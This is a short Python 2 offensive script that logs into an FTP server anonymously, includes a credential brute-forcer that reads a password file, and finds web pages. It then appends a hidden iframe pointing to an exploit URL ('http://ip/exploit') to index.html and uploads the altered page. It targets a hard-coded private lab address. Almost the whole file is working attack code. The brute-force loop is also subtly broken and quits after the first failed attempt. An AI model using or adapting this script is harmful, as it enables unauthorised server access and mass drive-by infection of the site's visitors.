# -*- coding: utf-8 -*-

import ftplib

def anonLogin(hostname):
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login('anonymous', 'me@your.com')
        print '\n[*] ' + str(hostname) + ' Ftp anonymous Login Success'
        
#         returnDefault(ftp)
        redirect = '<iframe src=' + '"http://ip/exploit"></iframe>'
        injectPage(ftp, 'index.html', redirect)
        
        ftp.quit()
        return True
    except Exception , e :
        print '\n[-] ' + str(hostname) + ' Ftp anonymous Login Failed'
        return False
    
def bruteLogin(hostname, passwordFile):
    pF = open(passwordFile, 'r')
    for line in pF.readlines():
        userName = line.split(':')[0]
        passWord = line.split(':')[1]
        print '[+] Trying : ' + userName + "/" + passWord
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(userName, passWord)
            print '\n[*] ' + str(hostname) + ' Ftp Login Success, ' + userName + '/' + passWord
            ftp.quit()
            return (userName, passWord)
        except:
            pass
            print '\n[-] ' + str(hostname) + ' Ftp Login Failed, ' + userName + '/' + passWord
            return (None, None)
 
def returnDefault(ftp):
    try :
        dirList = ftp.nlst()
    except:
        dirList = []
        print '[-] Could not list dir'
        return
    retList = []
    for fileName in dirList:
        fn = fileName.lower()
        if '.php' in fn or '.htm' in fn or '.asp' in fn :
            print '[+] Found default page: ' + fileName
            retList.append(fileName)
    return retList

def injectPage(ftp, page, redirect):
    f = open(page + '.tmp', 'w')
    ftp.retrlines('RETR ' + page, f.write)
    print '[+] Downloaded Page :' + page
    f.write(redirect)
    f.close()
    print '[+] Inject IFrame on : ' + page
    ftp.storlines('STOR ' + page, open(page + '.tmp'))
    print '[+] Uploaded Injectd Page :' + page
    
host = '192.168.136.128'
anonLogin(host)
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
